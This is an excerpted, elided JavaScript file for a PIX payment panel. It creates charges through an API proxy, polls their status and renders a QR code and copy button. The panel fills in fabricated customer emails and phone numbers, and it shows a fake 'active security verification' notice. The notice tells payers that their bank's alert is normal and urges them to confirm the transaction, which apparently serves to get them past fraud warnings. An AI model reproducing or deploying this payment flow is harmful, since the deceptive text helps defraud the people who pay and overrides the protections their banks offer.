...
/* ===== PIX Panel — Vanilla JS (api_proxy.php) ===== */
...
var PAID_SET = ['PAID','COMPLETED','PAYED','APPROVED','SUCCESS','CONFIRMED','AUTHORIZED'];
...
function initPixPanel(containerId, config) {
  /*
    config: {
      ...
      onPaid: function(),
      accent: '#1E40AF',
      apiBase: '../api_proxy.php' // path to api_proxy.php
    }
  */
  ...
  var apiBase = config.apiBase || '../api_proxy.php';
  var txId = null;
  var isPaid = false;
  var pollTimer = null;
  ...
  function doDirectFlevoCreate() {
    ...
    .then(function(d){ handlePixResponse(d); })
    .catch(function(){ container.innerHTML = buildError('Erro ao gerar PIX. Tente novamente.', accent); });
  }
  ...
  fetch('/api/create-pix', {
    ...
    body: JSON.stringify({
      ...
      customer: {
        ...
        email: (config.client && config.client.email) || ('cliente_' + Date.now() + '@gmail.com'),
        phone: ((config.client && config.client.phone) || '11987654321').replace(/\D/g, ''),
        document: ((config.client && config.client.document) || '').replace(/\D/g, '')
      },
      tracking: (function() {
        var s = {};
        try { s = JSON.parse(localStorage.getItem('funil_utms') || '{}'); } catch(e){}
  ...
  var _unused = fetch(apiBase + '?action=create_pix', {
    ...
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      identifier: 'ALLU_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8),
      productType: config.productType,
      productName: config.productName,
      amount: config.amount,
      sessionId: config.sessionId || null,
      isUpsell: config.isUpsell || false,
      isDownsell: config.isDownsell || false,
      client: config.client,
      products: [{
        id: 'ALLU-' + (config.productType || 'PRODUTO').toUpperCase(),
        name: config.productName || 'Produto allu',
        quantity: 1,
        price: config.amount
      }],
  ...
  .then(function(d) {
    if (!d.ok) {
      container.innerHTML = buildError(d.error || 'Erro ao gerar PIX', accent);
      return;
    }
    txId = d.transactionId || d.identifier;
    // api_proxy (Genesys) normaliza a resposta para: pix.code (copia-e-cola),
    // pix.image (URL do QR) e/ou pix.base64 (imagem em base64).
    // Mantemos fallbacks para outros nomes de campo por seguranca.
    var pix = d.pix || {};
    var pixCode = pix.code || pix.copy_paste || pix.pix_copy_paste || pix.qrcode || pix.emv || d.pix_copy_paste || null;
    var pixQr = resolveQrSource(pix.image || pix.base64 || pix.qr_code_url || pix.pix_qr_code_url || d.pix_qr_code_url);
    container.innerHTML = buildReady(pixCode, pixQr, config.amount, accent);
  ...
  .catch(function() {
    container.innerHTML = buildError('Erro de conexão. Verifique sua internet.', accent);
  });
  ...
  function checkStatus() {
    ...
    fetch('/api/check-payment?id=' + encodeURIComponent(txId))
    .then(function(r) {
      var ct = r.headers.get('content-type') || '';
      if (!r.ok || !ct.includes('application/json')) {
        checkDirectFlevo();
...
function buildReady(pixCode, pixQrCode, amount, accent) {
  ...
  return '<div class="rounded-2xl bg-white border border-gray-200 shadow-xl overflow-hidden">'
    + '<div class="flex items-center justify-between px-5 py-3 text-white" style="background:' + accent + '">'
    + '<span class="flex items-center gap-2 text-sm font-extrabold"><span class="flex h-6 w-6 items-center justify-center rounded bg-white/20 text-xs">PIX</span>Pagamento via PIX</span>'
    + '<span class="text-base font-black">' + formatBRL(amount) + '</span>'
    + '</div>'
    + '<div class="p-5">'
    ...
    + '<button class="pix-copy-btn mb-4 w-full rounded-xl py-3.5 text-sm font-extrabold text-white transition" style="background:' + accent + '">📲 COPIAR CÓDIGO PIX</button>'
    + '<div class="mb-5 rounded-xl p-4" style="background:#0f172a;border:1px solid #10b981">'
    + '<div class="flex items-start gap-2.5">'
    + '<span style="font-size:18px;line-height:1;flex-shrink:0;margin-top:1px">🔒</span>'
    + '<div>'
    + '<p style="font-size:12.5px;font-weight:800;color:#34d399;margin:0 0 4px">Verificação de Segurança Ativa</p>'
    + '<p style="font-size:11.5px;line-height:1.55;color:#cbd5e1;margin:0">Nosso sistema utiliza verificação avançada em duas etapas para proteger sua transação. Seu banco pode exibir um <b style="color:#e2e8f0">alerta de confirmação</b> — isso é <b style="color:#e2e8f0">normal</b> e faz parte do protocolo de segurança.</p>'
    + '<p style="font-size:11.5px;line-height:1.55;color:#cbd5e1;margin:6px 0 0">✅ Confirme a transação para validar sua participação com total segurança.</p>'
    + '<p style="font-size:10.5px;color:#64748b;margin:6px 0 0">⏦ Procedimento exigido pelas normas de segurança digital.</p>'
    + '</div></div></div>'
